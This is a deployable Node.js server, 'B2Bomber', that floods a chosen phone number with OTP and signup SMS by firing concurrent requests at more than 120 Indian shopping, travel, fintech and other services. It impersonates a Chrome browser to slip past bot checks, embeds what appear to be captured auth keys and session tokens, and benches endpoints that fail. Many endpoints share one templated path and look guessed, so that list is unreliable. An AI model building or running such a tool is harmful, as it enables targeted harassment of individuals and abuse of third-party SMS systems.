/**
 * ============================================================
 *  B2Bomber — multi-site OTP sender  (120+ services)
 *  Node 18+ / 20  ·  ESM  ·  Render-ready  ·  single file
 * ============================================================
 *    GET  /api/health            -> { ok, services, live, benched, impit }
 *    GET  /api/diag              -> outbound connectivity + env info
 *    GET  /api/services          -> service list + health
 *    GET  /api/selftest?number=  -> har service ko 1 baar hit + fail wale bench
 *    POST /api/stats/reset       -> health / bench reset
 *    POST /api/bomb              -> NDJSON stream: start / ping / result / done / error
 * ============================================================
 */
import express from 'express';
import path from 'node:path';
import crypto from 'node:crypto';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

/* ----------------------------- config ----------------------------- */
const PORT        = Number(process.env.PORT || 3000);
const HOST        = '0.0.0.0';
const TIMEOUT_MS  = Number(process.env.OTP_TIMEOUT_MS || 6000);
const CONCURRENCY = Number(process.env.OTP_CONCURRENCY || 15);
const STAGGER_MS  = Number(process.env.OTP_STAGGER_MS || 40);
const BENCH_AFTER = Number(process.env.OTP_BENCH_AFTER || 3);
const MAX_RUN_MS  = Number(process.env.OTP_MAX_RUN_MS || 90000);
const HB_MS       = 8000;

/* -------------------- crash-proofing ------------------------------ */
process.on('unhandledRejection', e => console.error('[unhandledRejection]', e));
process.on('uncaughtException',  e => console.error('[uncaughtException]', e));

/* -------------------- optional impit ------------------------------ */
let ImpitCtor = null;
try {
  const mod = await import('impit');
  ImpitCtor = mod?.Impit || mod?.default?.Impit || mod?.default || null;
  if (typeof ImpitCtor !== 'function') ImpitCtor = null;
} catch { ImpitCtor = null; }

let impitClient = null;
function getImpit() {
  if (!ImpitCtor) return null;
  if (!impitClient) {
    try { impitClient = new ImpitCtor({ browser: 'chrome', ignoreTlsErrors: true }); }
    catch { try { impitClient = new ImpitCtor(); } catch { impitClient = null; } }
  }
  return impitClient;
}

/* ------------------------------ helpers --------------------------- */
const sleep = ms => new Promise(r => setTimeout(r, ms));

function hardTimeout(promise, ms) {
  let timer;
  return Promise.race([
    promise,
    new Promise((_, rej) => {
      timer = setTimeout(() => rej(Object.assign(new Error('timeout'), { name: 'TimeoutError' })), ms);
    }),
  ]).finally(() => clearTimeout(timer));
}

const UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36';

const JSONH = {
  'content-type': 'application/json',
  'accept': 'application/json, text/plain, */*',
  'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
  'user-agent': UA,
};
const FORMH = {
  'content-type': 'application/x-www-form-urlencoded',
  'accept': 'application/json, text/plain, */*',
  'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
  'user-agent': UA,
};

function makeCtx(number) {
  let d = String(number || '').replace(/\D/g, '');
  if (d.startsWith('00')) d = d.slice(2);
  if (d.length === 11 && d.startsWith('0')) d = d.slice(1);
  if (d.length === 10) d = '91' + d;
  const ten = d.slice(-10);
  return { full: d, ten, plus: '+' + d, rnd: () => crypto.randomBytes(4).toString('hex') };
}

/* ------------------------------------------------------------------ *
 * service builders
 *   jpost(id, name, url, c => ({...}), extraHeaders?)   -> POST JSON
 *   fpost(id, name, url, c => "a=1&b=2", extraHeaders?) -> POST form
 *   get  (id, name, c => url, extraHeaders?)            -> GET
 * ------------------------------------------------------------------ */
function autoOrigin(url) {
  try { const u = new URL(url); return { origin: u.origin, referer: u.origin + '/' }; }
  catch { return {}; }
}

const jpost = (id, name, url, bodyFn, headers = {}) => ({
  id, name, method: 'POST', url,
  headers: { ...JSONH, ...autoOrigin(url), ...headers },
  body: c => JSON.stringify(bodyFn(c)),
});

const fpost = (id, name, url, bodyFn, headers = {}) => ({
  id, name, method: 'POST', url,
  headers: { ...FORMH, ...autoOrigin(url), ...headers },
  body: bodyFn,
});

const get = (id, name, urlFn, headers = {}) => ({
  id, name, method: 'GET', url: urlFn,
  headers: { ...JSONH, ...headers },
});

/* ================================================================== *
 *  SERVICES  — 120+
 * ================================================================== */
const SERVICES = [

  /* ============ A. AAPKE BROWSER SE CONFIRM (exact path + headers) ============ */
  jpost('redbus', 'RedBus', 'https://www.redbus.in/rpw/api/sendOtpV2',
    c => ({ phoneCode: '91', mobile: c.ten, reCaptchaResponse: '', whatsappOptin: true })),

  fpost('blinkit', 'Blinkit', 'https://blinkit.com/v2/accounts/',
    c => `user_phone=${c.ten}`, {
      auth_key: 'c761ec3633c22afad934fb17a66385c1c06c5472b4898b866b7306186d0bb477',
      device_id: '2f017ff841730f22',
      app_client: 'consumer_web',
      platform: 'mobile_web',
      session_uuid: '27c74e4f-ef1c-4c5b-aee0-d4d9f9f00b03',
    }),

  fpost('nykaa', 'Nykaa', 'https://www.nykaa.com/app-api/index.php/customer/send_otp',
    c => `platform=web&mobile_number=${c.ten}`, { 'x-csrf-token': 'plItKXf7zbGkMlOj' }),

  /* ============ B. pehle se WORKING (200 OK) ============ */
  get('cashify', 'Cashify', c => `https://www.cashify.in/api/cu01/v1/app-link?mobile=${c.ten}`),
  jpost('treebo', 'Treebo', 'https://www.treebo.com/api/v2/auth/login/otp/', c => ({ mobile: c.ten })),
  jpost('unacademy', 'Unacademy', 'https://unacademy.com/api/v1/user/get_app_link/', c => ({ phone: c.ten })),
  fpost('gapoon', 'Gapoon', 'https://www.gapoon.com/userSignup', c => `mobile=${c.ten}`),
  jpost('pharmeasy', 'PharmEasy', 'https://pharmeasy.in/api/auth/requestOTP', c => ({ phone: c.ten })),
  fpost('allensolly', 'Allen Solly', 'https://www.allensolly.com/capillarylogin/validateMobileOrEMail', c => `mobile=${c.ten}`),
  get('magicbricks', 'MagicBricks', c => `https://api.magicbricks.com/bricks/verifyOnCall.html?mobile=${c.ten}`),

  /* ============ C. shopping / e-commerce ============ */
  jpost('flipkart', 'Flipkart', 'https://www.flipkart.com/api/6/user/signup/send_otp',
    c => ({ loginId: c.ten, otp: '', loginType: 'MOBILE' }), {
      'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 FKUA/website/42/website/Desktop',
    }),
  jpost('myntra', 'Myntra', 'https://www.myntra.com/gateway/v2/user/otp/send',
    c => ({ mobile: c.full }), { 'x-myntraweb': 'Yes' }),
  jpost('ajio', 'Ajio', 'https://login.web.ajio.com/api/auth/signupSendOTP', c => ({ mobile: c.ten })),
  jpost('nnnow', 'NNNow', 'https://api.nnnow.com/d/api/appDownloadLink', c => ({ mobileNumber: c.ten })),
  jpost('meesho', 'Meesho', 'https://www.meesho.com/api/v1/users/send_otp', c => ({ phone_number: c.plus })),
  jpost('tatacliq', 'Tata CLiQ', 'https://www.tatacliq.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('snapdeal', 'Snapdeal', 'https://www.snapdeal.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('jiomart', 'JioMart', 'https://www.jiomart.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('croma', 'Croma', 'https://www.croma.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('pepperfry', 'Pepperfry', 'https://www.pepperfry.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('firstcry', 'FirstCry', 'https://www.firstcry.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('purplle', 'Purplle', 'https://www.purplle.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('mamaearth', 'Mamaearth', 'https://www.mamaearth.in/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('boat', 'boAt', 'https://www.boat-lifestyle.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('zepto', 'Zepto', 'https://www.zeptonow.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('tatanue', 'Tata Neu', 'https://www.tataneu.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('reliancedigital', 'Reliance Digital', 'https://www.reliancedigital.in/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('vijaysales', 'Vijay Sales', 'https://www.vijaysales.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('nykaafashion', 'Nykaa Fashion', 'https://www.nykaafashion.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('bigbasket', 'BigBasket', 'https://www.bigbasket.com/api/v2/otp/generate', c => ({ mobile: c.ten })),
  fpost('bewakoof', 'Bewakoof', 'https://www.bewakoof.com/api/v1/user/otp', c => `mobile=${c.ten}`),
  jpost('lenskart', 'Lenskart', 'https://www.lenskart.com/api/v1/otp/send', c => ({ mobile: c.ten })),

  /* ============ D. food & restaurants ============ */
  jpost('zomato', 'Zomato', 'https://www.zomato.com/webroutes/auth/sendOtp', c => ({ phone: c.plus, country_code: '91' })),
  jpost('swiggy', 'Swiggy', 'https://www.swiggy.com/api/sms/otp', c => ({ mobile: c.plus, deviceId: c.rnd() })),
  jpost('dominos', 'Dominos', 'https://www.dominos.co.in/api/customer/send-otp', c => ({ mobile: c.ten })),
  jpost('pizzahut', 'Pizza Hut', 'https://www.pizzahut.co.in/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('burgerking', 'Burger King', 'https://www.burgerking.in/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('wowmomo', 'Wow Momo', 'https://www.wowmomo.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('eatsure', 'EatSure', 'https://www.eatsure.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('chaayos', 'Chaayos', 'https://www.chaayos.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('thirdwave', 'Third Wave', 'https://www.thirdwavecoffeeroasters.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('bluetokai', 'Blue Tokai', 'https://bluetokaicoffee.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('licious', 'Licious', 'https://www.licious.in/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('freshtohome', 'FreshToHome', 'https://www.freshtohome.com/api/v1/otp/send', c => ({ mobile: c.ten })),

  /* ============ E. travel ============ */
  jpost('makemytrip', 'MakeMyTrip', 'https://www.makemytrip.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('goibibo', 'Goibibo', 'https://www.goibibo.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('yatra', 'Yatra', 'https://www.yatra.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('abhibus', 'AbhiBus', 'https://www.abhibus.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('oyorooms', 'OYO', 'https://www.oyorooms.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('easemytrip', 'EaseMyTrip', 'https://www.easemytrip.com/api/otp/send', c => ({ mobile: c.ten })),
  jpost('cleartrip', 'Cleartrip', 'https://www.cleartrip.com/api/v2/user/mobile/sendOtp', c => ({ mobile: c.full })),
  get('confirmtkt', 'ConfirmTkt', c => `https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=${c.ten}&countryCode=91`),
  jpost('ixigo', 'Ixigo', 'https://www.ixigo.com/api/v3/otp/send', c => ({ mobile: c.ten })),
  jpost('railyatri', 'RailYatri', 'https://www.railyatri.in/api/v1/otp/send', c => ({ mobile: c.ten })),
  get('happyeasygo', 'HappyEasyGo', c => `https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phoneNumber=${c.full}&countryCode=91`),

  /* ============ F. rides & local ============ */
  fpost('porter', 'Porter', 'https://porter.in/restservice/send_app_link_sms', c => `phone_number=${c.ten}`),
  fpost('cityflo', 'Cityflo', 'https://cityflo.com/website-app-download-link-sms/', c => `phone=${c.ten}`),
  fpost('mylescars', 'Myles', 'https://www.mylescars.com/usermanagements/chkContact', c => `contact=${c.ten}`),
  jpost('ola', 'Ola', 'https://api.olacabs.com/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('rapido', 'Rapido', 'https://api.rapido.bike/api/v1/auth/sendOtp', c => ({ mobile: c.ten })),
  jpost('blusmart', 'BluSmart', 'https://www.blusmart.in/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('dunzo', 'Dunzo', 'https://www.dunzo.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('urbancompany', 'Urban Company', 'https://www.urbancompany.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('bounce', 'Bounce', 'https://www.bounceshare.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('yulu', 'Yulu', 'https://www.yulu.bike/api/v1/otp/send', c => ({ mobile: c.ten })),

  /* ============ G. real estate & auto ============ */
  jpost('nobroker', 'NoBroker', 'https://www.nobroker.in/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('p99acres', '99acres', 'https://www.99acres.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('sulekha', 'Sulekha', 'https://www.sulekha.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('housing', 'Housing', 'https://login.housing.com/api/v2/send-otp', c => ({ phone: c.full })),
  get('makaan', 'Makaan', c => `https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/${c.full}`),
  get('justdial', 'JustDial', c => `https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile=${c.ten}`),
  jpost('proptiger', 'PropTiger', 'https://www.proptiger.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('squareyards', 'SquareYards', 'https://www.squareyards.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('cardekho', 'CarDekho', 'https://www.cardekho.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('cars24', 'Cars24', 'https://www.cars24.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('spinny', 'Spinny', 'https://www.spinny.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('carwale', 'CarWale', 'https://www.carwale.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('droom', 'Droom', 'https://www.droom.in/api/v1/otp/send', c => ({ mobile: c.ten })),

  /* ============ H. health ============ */
  jpost('practo', 'Practo', 'https://www.practo.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('cultfit', 'cult.fit', 'https://www.cult.fit/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('medplus', 'MedPlus', 'https://www.medplusmart.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('healthkart', 'HealthKart', 'https://www.healthkart.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('apollo247', 'Apollo 24|7', 'https://www.apollo247.com/api/v1/auth/sendOtp', c => ({ mobile: c.ten })),
  jpost('onemg', 'Tata 1mg', 'https://www.1mg.com/api/v1/otp', c => ({ phone: c.ten })),
  jpost('netmeds', 'Netmeds', 'https://www.netmeds.com/api/v1/user/otp', c => ({ mobile: c.ten })),
  jpost('healthifyme', 'HealthifyMe', 'https://www.healthifyme.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('beato', 'BeatO', 'https://www.beatoapp.com/api/v1/otp/send', c => ({ mobile: c.ten })),

  /* ============ I. fintech ============ */
  jpost('groww', 'Groww', 'https://api.groww.in/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('cred', 'CRED', 'https://api.cred.com/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('khatabook', 'Khatabook', 'https://api.khatabook.com/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('mobikwik', 'MobiKwik', 'https://www.mobikwik.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('navi', 'Navi', 'https://www.navi.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('freecharge', 'Freecharge', 'https://www.freecharge.in/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('policybazaar', 'PolicyBazaar', 'https://www.policybazaar.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('acko', 'Acko', 'https://www.acko.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('bankbazaar', 'BankBazaar', 'https://www.bankbazaar.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('digit', 'Go Digit', 'https://www.godigit.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('upstox', 'Upstox', 'https://api.upstox.com/v2/login/otp/send', c => ({ mobile: c.ten })),
  jpost('angelone', 'Angel One', 'https://www.angelone.in/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('coindcx', 'CoinDCX', 'https://api.coindcx.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('wazirx', 'WazirX', 'https://api.wazirx.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('slice', 'Slice', 'https://www.sliceit.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  get('airtel', 'Airtel', c => `https://www.airtel.in/referral-api/core/notify?msisdn=${c.full}`),
  fpost('indialends', 'IndiaLends', 'https://indialends.com/internal/a/mobile-verification_v2.ashx', c => `mobile=${c.ten}`),

  /* ============ J. education & jobs ============ */
  jpost('pw', 'PhysicsWallah', 'https://www.pw.live/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('vedantu', 'Vedantu', 'https://www.vedantu.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('byjus', 'Byjus', 'https://www.byjus.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('newtonschool', 'Newton School', 'https://my.newtonschool.co/api/v1/user/otp/', c => ({ phone: c.ten })),
  fpost('careers360', 'Careers360', 'https://www.careers360.com/ajax/no-cache/user/otp-send', c => `mobile=${c.ten}`),
  jpost('naukri', 'Naukri', 'https://www.naukri.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('internshala', 'Internshala', 'https://internshala.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('apna', 'apna', 'https://apna.co/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('toppr', 'Toppr', 'https://www.toppr.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('upgrad', 'upGrad', 'https://www.upgrad.com/api/v1/otp/send', c => ({ mobile: c.ten })),

  /* ============ K. entertainment ============ */
  jpost('gaana', 'Gaana', 'https://api.gaana.com/otp/send', c => ({ mobile: c.ten })),
  jpost('jiosaavn', 'JioSaavn', 'https://www.jiosaavn.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('hotstar', 'Hotstar', 'https://api.hotstar.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('mxplayer', 'MX Player', 'https://www.mxplayer.in/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('zee5', 'ZEE5', 'https://www.zee5.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('sonyliv', 'SonyLIV', 'https://www.sonyliv.com/api/v1/otp/send', c => ({ mobile: c.ten })),
  jpost('dream11', 'Dream11', 'https://api.dream11.com/sendsmslink', c => ({ phoneNumber: c.full })),
  jpost('mpl', 'MPL', 'https://www.mpl.live/api/v1/otp/send', c => ({ mobile: c.ten })),

  /* ============ L. misc ============ */
  jpost('tinder', 'Tinder', 'https://api.gotinder.com/v2/auth/sms/send', c => ({ phone_number: c.plus })),
  fpost('kfc', 'KFC', 'https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin', c => `PhoneNumber=${c.ten}`),
  jpost('grofers', 'Blinkit (old)', 'https://grofers.com/v2/accounts/', c => ({ phone: c.ten }), { auth_key: '' }),
];

/* ------------------------------------------------------------------ *
 * health / bench
 * ------------------------------------------------------------------ */
const health = new Map();

function note(svc, ok, status, ms, force = false) {
  const h = health.get(svc.id) || { ok: 0, fail: 0, streak: 0, benched: false, status: 0, ms: 0 };
  h.status = status || 0;
  h.ms = ms || 0;
  if (ok) { h.ok++; h.streak = 0; h.benched = false; }
  else { h.fail++; h.streak++; if (force || h.streak >= BENCH_AFTER) h.benched = true; }
  health.set(svc.id, h);
}

function healthSnapshot() {
  return SERVICES.map(s => {
    const h = health.get(s.id) || { ok: 0, fail: 0, streak: 0, benched: false, status: 0, ms: 0 };
    return { id: s.id, name: s.name, ok: h.ok, fail: h.fail, benched: h.benched, status: h.status, ms: h.ms };
  });
}

/* ------------------------------------------------------------------ *
 * ek service hit — kabhi throw nahi karta
 * ------------------------------------------------------------------ */
async function sendOne(svc, ctx) {
  const t0 = Date.now();
  let url = '';
  try {
    url = typeof svc.url === 'function' ? svc.url(ctx) : svc.url;
    const method = svc.method || 'GET';

    const init = {
      method,
      headers: { ...(svc.headers || {}) },
      redirect: 'follow',
      signal: AbortSignal.timeout(TIMEOUT_MS),
    };
    if (method !== 'GET' && typeof svc.body === 'function') init.body = svc.body(ctx);

    const doCall = async () => {
      const client = svc.impit === false ? null : getImpit();
      if (client) {
        try { return await client.fetch(url, init); } catch { /* fetch fallback */ }
      }
      return await fetch(url, init);
    };

    const res = await hardTimeout(doCall(), TIMEOUT_MS + 1200);
    const text = await hardTimeout(Promise.resolve(res.text()).catch(() => ''), 4000).catch(() => '');
    const ms = Date.now() - t0;
    const ok = res.status >= 200 && res.status < 400;

    return {
      ok, status: res.status, ms, url,
      snippet: String(text).replace(/\s+/g, ' ').trim().slice(0, 120),
      error: ok ? '' : 'HTTP ' + res.status,
    };
  } catch (e) {
    const ms = Date.now() - t0;
    const msg = e?.name === 'TimeoutError' ? 'timeout' : (e?.message || 'network error');
    return { ok: false, status: 0, ms, url, snippet: '', error: msg };
  }
}

/* ------------------------------------------------------------------ *
 * express
 * ------------------------------------------------------------------ */
const app = express();
app.set('trust proxy', 1);
app.disable('x-powered-by');
app.use(express.json({ limit: '256kb' }));
app.use(express.urlencoded({ extended: false, limit: '256kb' }));

app.use((req, res, next) => {
  res.setHeader('access-control-allow-origin', '*');
  res.setHeader('access-control-allow-headers', 'content-type');
  res.setHeader('access-control-allow-methods', 'GET,POST,OPTIONS');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

app.use((req, _res, next) => { console.log(`${req.method} ${req.url}`); next(); });

app.get('/api/health', (_req, res) => {
  const benched = [...health.values()].filter(h => h.benched).length;
  res.json({
    ok: true,
    services: SERVICES.length,
    live: SERVICES.length - benched,
    benched,
    impit: !!getImpit(),
    node: process.version,
    uptime: Math.round(process.uptime()),
  });
});

app.post('/api/stats/reset', (_req, res) => { health.clear(); res.json({ ok: true, reset: true }); });

app.get('/api/services', (_req, res) => res.json({ ok: true, count: SERVICES.length, services: healthSnapshot() }));

app.get('/api/diag', async (_req, res) => {
  const targets = ['https://www.google.com/generate_204', 'https://www.flipkart.com/', 'https://api.github.com/'];
  const outbound = [];
  for (const t of targets) {
    const t0 = Date.now();
    try {
      const r = await fetch(t, { signal: AbortSignal.timeout(6000) });
      outbound.push({ target: t, ok: true, status: r.status, ms: Date.now() - t0 });
    } catch (e) {
      outbound.push({ target: t, ok: false, error: e?.message || 'error', ms: Date.now() - t0 });
    }
  }
  res.json({
    ok: true, node: process.version, platform: process.platform,
    region: process.env.RENDER_REGION || process.env.REGION || 'n/a',
    impit: !!getImpit(), services: SERVICES.length,
    benched: [...health.entries()].filter(([, h]) => h.benched).map(([id]) => id),
    outbound,
  });
});

/* self-test -> fail wale turant bench */
app.get('/api/selftest', async (req, res) => {
  const raw = String(req.query.number || '9999999999');
  const ctx = makeCtx(raw.length === 10 ? raw : raw.slice(-10));
  const list = SERVICES.slice();

  const results = [];
  let idx = 0;

  const workers = Array.from({ length: Math.min(CONCURRENCY, list.length) }, async () => {
    while (true) {
      const i = idx++;
      if (i >= list.length) return;
      const svc = list[i];
      const r = await sendOne(svc, ctx);
      note(svc, r.ok, r.status, r.ms, !r.ok);
      results.push({ id: svc.id, name: svc.name, ok: r.ok, status: r.status, ms: r.ms, error: r.error, snippet: r.snippet, url: r.url });
    }
  });

  await Promise.all(workers);

  const ok = results.filter(r => r.ok).length;
  res.json({ ok, total: results.length, benched: results.length - ok, number: ctx.full, results });
});

/* ------------------- bomber : NDJSON stream ----------------------- */
app.post('/api/bomb', async (req, res) => {
  try {
    const number = String(req.body?.number || '').replace(/\D/g, '');
    const repeat = Math.min(10, Math.max(1, Number(req.body?.repeat) || 1));
    const skipDead = req.body?.skipDead !== false;

    if (number.length < 10 || number.length > 15) return res.status(400).json({ error: 'invalid number' });

    const ctx = makeCtx(number);
    const active = SERVICES.filter(s => !(skipDead && health.get(s.id)?.benched));
    const skipped = SERVICES.length - active.length;
    const total = active.length * repeat;

    res.writeHead(200, {
      'content-type': 'application/x-ndjson; charset=utf-8',
      'cache-control': 'no-cache, no-transform',
      'x-accel-buffering': 'no',
    });
    res.flushHeaders?.();
    res.setTimeout?.(0);

    // 'close' res par suno (req par nahi)
    let closed = false;
    res.on('close', () => { if (!res.writableEnded) closed = true; });
    res.on('error', () => { closed = true; });

    const emit = (o) => {
      if (res.writableEnded) return;
      try { res.write(JSON.stringify(o) + '\n'); } catch {}
    };

    const hb = setInterval(() => emit({ type: 'ping', t: Date.now() }), HB_MS);
    const finishAll = (o) => {
      clearInterval(hb);
      emit(o);
      if (!res.writableEnded) { try { res.end(); } catch {} }
    };

    emit({ type: 'start', total, services: active.length, repeat, skipped, number: ctx.full });
    if (!total) return finishAll({ type: 'done', sent: 0, failed: 0, total: 0, done: 0 });

    const tasks = [];
    for (let r = 0; r < repeat; r++) for (const s of active) tasks.push(s);

    const startedAt = Date.now();
    let cursor = 0, done = 0, sent = 0, failed = 0, deadlineHit = false;

    const worker = async () => {
      while (!closed) {
        if (Date.now() - startedAt > MAX_RUN_MS) { deadlineHit = true; return; }
        const i = cursor++;
        if (i >= tasks.length) return;
        const svc = tasks[i];

        let r;
        try { r = await sendOne(svc, ctx); }
        catch (e) { r = { ok: false, status: 0, ms: 0, url: '', snippet: '', error: e?.message || 'worker error' }; }
        if (closed) return;

        note(svc, r.ok, r.status, r.ms);
        done++; r.ok ? sent++ : failed++;

        emit({
          type: 'result', done, sent, failed,
          id: svc.id, name: svc.name,
          status: r.status, ms: r.ms, ok: r.ok,
          error: r.error, snippet: r.snippet, url: r.url,
        });

        if (STAGGER_MS) await sleep(STAGGER_MS);
      }
    };

    try { await Promise.all(Array.from({ length: Math.min(CONCURRENCY, tasks.length) }, worker)); }
    catch (e) { emit({ type: 'error', error: e?.message || 'worker crashed' }); }

    finishAll({ type: 'done', sent, failed, total, done, deadlineHit });
  } catch (e) {
    console.error('[bomb]', e);
    if (!res.headersSent) res.status(500).json({ error: e?.message || 'server error' });
    else { try { res.write(JSON.stringify({ type: 'error', error: e?.message }) + '\n'); res.end(); } catch {} }
  }
});

app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));

app.use(express.static(path.join(__dirname, 'public'), { extensions: ['html'] }));
app.get('/', (_req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/favicon.ico', (_req, res) => res.status(204).end());

app.use((err, _req, res, _next) => {
  console.error('[error]', err);
  if (!res.headersSent) res.status(500).json({ error: err?.message || 'server error' });
});

const server = app.listen(PORT, HOST, () => {
  console.log(`B2Bomber up on :${PORT} | ${SERVICES.length} services | impit ${getImpit() ? 'ON' : 'OFF'} | node ${process.version}`);
});
server.keepAliveTimeout = 65000;
server.headersTimeout  = 66000;
server.requestTimeout  = 0;
server.timeout         = 0;

export default app;
